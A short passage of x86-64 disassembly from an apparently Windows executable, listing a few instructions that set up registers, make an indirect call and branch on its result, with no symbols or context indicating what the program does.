   14000528a:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   14000528e:	0f 29 4d d0          	movaps %xmm1,-0x30(%rbp)
   140005292:	ff 15 18 62 02 00    	call   *0x26218(%rip)        # 0x14002b4b0
   140005298:	85 c0                	test   %eax,%eax
   14000529a:	75 6e                	jne    0x14000530a
   14000529c:	48 63 47 28          	movslq 0x28(%rdi),%rax
   1400052a0:	85 c0                	test   %eax,%eax
   1400052a2:	74 4b                	je     0x1400052ef
   1400052a4:	4c 8d 83 88 00 00 00 	lea    0x88(%rbx),%r8
   1400052ab:	48 8b 4f 30          	mov    0x30(%rdi),%rcx
   1400052af:	4c 8b c8             	mov    %rax,%r9
   1400052b2:	48 8b 05 37 cb 03 00 	mov    0x3cb37(%rip),%rax        # 0x140041df0
   1400052b9:	48 8b d3             	mov    %rbx,%rdx
